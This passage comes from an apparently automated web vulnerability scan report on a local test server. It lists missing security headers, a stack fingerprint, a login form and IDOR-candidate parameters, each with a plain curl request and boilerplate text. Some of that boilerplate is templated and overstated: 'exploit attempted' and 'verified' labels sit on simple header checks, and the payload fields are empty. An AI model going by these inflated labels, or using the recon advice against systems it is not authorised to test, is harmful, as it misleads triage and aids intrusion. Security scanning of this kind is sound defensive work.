All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Send Referrer-Policy: no-referrer or strict-origin-when-cross-origin.

### 55. [INFO] Missing Cross-Origin-Embedder-Policy

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-200
- **Module:** security-headers

**Description.** Without COEP, the document cannot enable cross-origin isolation; shared resources can be loaded without explicit opt-in.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'cross-origin-embedder-policy'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Send Cross-Origin-Embedder-Policy: require-corp (or credentialless) if the app needs SharedArrayBuffer / cross-origin isolation.

### 56. [INFO] Missing Cross-Origin-Opener-Policy

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-200
- **Module:** security-headers

**Description.** Without COOP, a malicious site can open the page in a popup and reach into its window object across origins.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'cross-origin-opener-policy'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Send Cross-Origin-Opener-Policy: same-origin.

### 57. [INFO] Missing Cross-Origin-Resource-Policy

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-200
- **Module:** security-headers

**Description.** Without CORP, the resource can be loaded by any origin (subject to CORS); useful as defence-in-depth against Spectre-style attacks.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'cross-origin-resource-policy'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Send Cross-Origin-Resource-Policy: same-origin.

### 58. [INFO] Missing X-DNS-Prefetch-Control

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-200
- **Module:** security-headers

**Description.** Without X-DNS-Prefetch-Control: off, browsers may prefetch cross-origin hostnames in links, leaking user behaviour to third-party DNS resolvers.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'x-dns-prefetch-control'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Send X-DNS-Prefetch-Control: off (or use <link rel=dns-prefetch> selectively).

### 59. [INFO] Missing X-Permitted-Cross-Domain-Policies

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-16
- **Module:** security-headers

**Description.** Without X-Permitted-Cross-Domain-Policies: none, legacy Flash / PDF plugins may embed the site cross-domain.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'x-permitted-cross-domain-policies'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Send X-Permitted-Cross-Domain-Policies: none.

### 60. [INFO] Missing Pragma: no-cache (legacy)

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-525
- **Module:** security-headers

**Description.** No Pragma header; legacy HTTP/1.0 caches may still store the response. Modern Cache-Control is preferred, but Pragma adds belt-and-braces protection.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'pragma'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Send Pragma: no-cache on sensitive responses alongside Cache-Control.

### 61. [INFO] Technology stack identified (4 components)

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-200
- **Module:** tech-fingerprint

**Description.** The response headers, cookies and HTML identify the underlying web stack. Use this to drive targeted CVE research and exploit-selection for the active phase.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Framework: Express
Language: Node.js
OS: Ubuntu
Web server: nginx
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Strip identifying response headers (Server, X-Powered-By, X-AspNet-Version) and remove generator meta tags to reduce passive fingerprinting surface.

### 62. [INFO] No WAF / CDN detected via headers

- **Class:** Reconnaissance / Attack-Surface Mapping
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** confidence: tentative
- **Module:** waf-detection

**Description.** No WAF / CDN signatures were detected in the response headers. The target may be directly exposed, or the WAF may be transparent to headers -- behavioural probing during the active phase will confirm.

**Detection evidence.**

```
server=uvicorn, nginx/1.18.0 (Ubuntu)
```

**Remediation.** Confirm origin exposure; deploy a WAF if missing.

### 63. [INFO] Authentication form detected (manual auth testing recommended)

- **Class:** Brute-Force / Credential Stuffing
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** confidence: tentative (exploit attempted)
- **CWE:** CWE-307
- **Module:** advisory

**Description.** A login form was found. Manually test rate limiting/lockout (brute-force, credential stuffing), MFA bypass, session fixation, and OAuth/SAML config.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Password input present on page.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Enforce rate limiting/lockout, MFA, session rotation on login, and validate SSO config.

### 64. [INFO] IDOR-candidate parameter 'id'

- **Class:** IDOR
- **URL:** http://127.0.0.1:8081/item
- **Injection point:** `GET /item`
- **Status:** confidence: tentative (exploit attempted)
- **CWE:** CWE-639
- **Module:** advisory

**Description.** 'id' looks like a direct object reference. Manually test access control by changing it across accounts (IDOR / horizontal & vertical priv-esc).

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
id=1 (numeric object identifier).
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'id=1' 'http://127.0.0.1:8081/item'
```

**Raw HTTP exchange:**

```http
GET /item?id=1 HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/item in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Enforce per-object authorization server-side; use unguessable references.

### 65. [INFO] IDOR-candidate parameter 'id'

- **Class:** IDOR
- **URL:** http://127.0.0.1:8081/product
- **Injection point:** `GET /product`
- **Status:** confidence: tentative (exploit attempted)
- **CWE:** CWE-639
- **Module:** advisory

**Description.** 'id' looks like a direct object reference. Manually test access control by changing it across accounts (IDOR / horizontal & vertical priv-esc).

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
id=1 (numeric object identifier).
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'id=1' 'http://127.0.0.1:8081/product'
```

**Raw HTTP exchange:**

```http
GET /product?id=1 HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/product in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Enforce per-object authorization server-side; use unguessable references.

## Methodology & limitations

1. **Crawl.** Same-origin crawl of the authorized target discovered 17 URL(s) and 20 injectable target(s) (query parameters and forms).
2. **Detection.** Passive recon modules ran first (attack-surface mapping above); active modules then sent non-destructive probe payloads to detect injection, XSS, traversal, SSRF and misconfiguration classes.
3. **Exploitation.** 14 finding(s) were re-targeted with safe impact-proof exploits: read-only SQL extraction, informational command execution (`id`, `uname`), system-file reads, executable-payload survival checks and loopback fetches. No data was modified or destroyed, and no denial-of-service techniques were used.
4. **Attack chaining.** The exploit-chainer looked for combinations of findings whose combined impact exceeds the sum of the parts (traversal->credentials->takeover, SSRF->internal admin, XSS->session theft, ...). Chains run only in aggressive mode, re-use proven primitives within the same request budget, and are recorded with full provenance: 4 chain(s) recorded.
5. **False-positive verification.** Findings the exploit phase could not prove were re-tested with control experiments: negative controls (payload with the active ingredient removed), repeat-consistency probes, baseline-cleanliness checks, fresh per-check canaries and differential directionality. 45 passed all controls; 1 were flagged for manual review. A succeeded exploit is its own false-positive disproof, so it bypasses this battery.
6. **Code attribution.** No source directory was supplied (--source-dir), so findings carry behaviour-derived sink reconstructions instead of verbatim source lines.
7. **Reporting.** Every claim in this report is backed by the captured request/response evidence shown alongside it. Findings that could not be proven are explicitly labelled with their confidence (tentative/firm) rather than overclaimed.

**Limitations.** Automated testing cannot cover business-logic flaws, authenticated flows without credentials, or client-side-only rendering. Candidates flagged for manual review should be verified by a human before triage decisions are made.
